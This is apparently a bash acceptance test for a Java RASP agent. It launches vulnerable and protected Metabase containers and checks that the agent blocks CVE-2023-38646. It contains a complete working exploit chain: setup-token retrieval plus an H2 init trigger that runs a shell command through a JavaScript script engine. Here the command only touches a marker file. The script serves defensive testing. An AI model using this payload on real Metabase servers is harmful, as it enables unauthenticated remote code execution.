#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java11/build/libs/ohmyrasp-agent-java11.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java11:agentJava11Jar

baseline_name="${OHMYRASP_VULHUB_METABASE_38646_BASELINE_NAME:-ohmyrasp-vulhub-metabase-38646-baseline}"
protected_name="${OHMYRASP_VULHUB_METABASE_38646_PROTECTED_NAME:-ohmyrasp-vulhub-metabase-38646-protected}"
baseline_port="${OHMYRASP_VULHUB_METABASE_38646_BASELINE_PORT:-18800}"
protected_port="${OHMYRASP_VULHUB_METABASE_38646_PROTECTED_PORT:-18801}"
image="${OHMYRASP_VULHUB_METABASE_38646_IMAGE:-vulhub/metabase:0.46.6}"
baseline_dir="logs/vulhub-metabase-2023-38646-java11-baseline"
protected_dir="logs/vulhub-metabase-2023-38646-java11-protected"
protected_log="${protected_dir}/events.jsonl"
marker="/tmp/ohmyrasp-metabase38646-success"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local port="$2"
  local status
  for _ in $(seq 1 300); do
    status="$(curl --max-time 2 -sS -o "/tmp/${name}.health" -w "%{http_code}" \
      "http://127.0.0.1:${port}/api/health" 2>/dev/null || true)"
    if [[ "$status" == "200" || "$status" == "204" ]]; then
      return
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "${name} did not expose Metabase health at ${port}" >&2
  exit 1
}

metabase_setup_token() {
  local port="$1"
  local output="$2"
  local status
  status="$(curl --max-time 10 -sS -o "$output" -w "%{http_code}" \
    "http://127.0.0.1:${port}/api/session/properties" || true)"
  if [[ "$status" != "200" ]]; then
    cat "$output" >&2 || true
    echo "Metabase session properties returned unexpected status ${status}" >&2
    exit 1
  fi
  sed -n 's/.*"setup-token":"\([^"]*\)".*/\1/p' "$output" | head -n1
}

metabase_setup_validate_payload() {
  local token="$1"
  local escaped_token="${token//&/\\&}"
  sed "s/SETUP_TOKEN/${escaped_token}/" <<'JSON'
{
  "token": "SETUP_TOKEN",
  "details": {
    "is_on_demand": false,
    "is_full_sync": false,
    "is_sample": false,
    "cache_ttl": null,
    "refingerprint": false,
    "auto_run_queries": true,
    "schedules": {},
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
      "advanced-options": false,
      "ssl": true,
      "init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('touch /tmp/ohmyrasp-metabase38646-success')\n$$"
    },
    "name": "ohmyrasp-metabase38646",
    "engine": "h2"
  }
}
JSON
}

send_setup_validate() {
  local port="$1"
  local token="$2"
  local output="$3"
  local payload
  payload="$(metabase_setup_validate_payload "$token")"
  curl --max-time 30 -sS -i -o "$output" -w "%{http_code}" \
    -X POST -H 'Content-Type: application/json' --data-binary "$payload" \
    "http://127.0.0.1:${port}/api/setup/validate" || true
}

expect_protected_startup_without_detection() {
  if ! grep -q '"event":"ohmyrasp-java11-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 11 startup event in protected Metabase container" >&2
    exit 1
  fi
  if ! grep -q '"script_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing Java 11 script hook startup marker in protected Metabase container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected Metabase container produced a detection before exploit traffic" >&2
    exit 1
  fi
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
chmod 755 "$protected_dir"
: > "$protected_log"
chmod 666 "$protected_log"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:3000" \
  "$image" >/dev/null

docker run -d --name "$protected_name" \
  -p "${protected_port}:3000" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java11.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java11.jar -Dohmyrasp.java11.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java11.block=true" \
  "$image" >/dev/null

wait_for "$baseline_name" "$baseline_port"
wait_for "$protected_name" "$protected_port"
expect_protected_startup_without_detection

baseline_token="$(metabase_setup_token "$baseline_port" "${baseline_dir}/session-properties.json")"
protected_token="$(metabase_setup_token "$protected_port" "${protected_dir}/session-properties.json")"
if [[ -z "$baseline_token" || -z "$protected_token" ]]; then
  cat "${baseline_dir}/session-properties.json" >&2 || true
  cat "${protected_dir}/session-properties.json" >&2 || true
  echo "Metabase did not expose setup tokens" >&2
  exit 1
fi
expect_protected_startup_without_detection

baseline_status="$(send_setup_validate "$baseline_port" "$baseline_token" "${baseline_dir}/setup-validate.response")"
if [[ "$baseline_status" == "000" ]]; then
  cat "${baseline_dir}/setup-validate.response" >&2 || true
  echo "baseline Metabase setup validate did not reach the HTTP endpoint" >&2
  exit 1
fi
if ! docker exec "$baseline_name" test -f "$marker"; then
  cat "${baseline_dir}/setup-validate.response" >&2 || true
  echo "baseline Metabase setup validate did not execute the H2 init payload" >&2
  exit 1
fi

protected_status="$(send_setup_validate "$protected_port" "$protected_token" "${protected_dir}/setup-validate.response")"
if [[ "$protected_status" == "000" ]]; then
  cat "${protected_dir}/setup-validate.response" >&2 || true
  echo "protected Metabase setup validate did not reach the HTTP endpoint" >&2
  exit 1
fi
if docker exec "$protected_name" test -f "$marker"; then
  cat "${protected_dir}/setup-validate.response" >&2 || true
  echo "protected Metabase created ${marker} despite Java11 RASP" >&2
  exit 1
fi
if ! grep -q '"hook":"ScriptEngine.eval".*"algorithm":"java11_script_engine_runtime_execution".*"action":"block"' "$protected_log"; then
  cat "$protected_log" >&2
  echo "missing java11_script_engine_runtime_execution block event for Metabase CVE-2023-38646" >&2
  exit 1
fi

echo "vulhub Metabase CVE-2023-38646 Java11 acceptance passed"
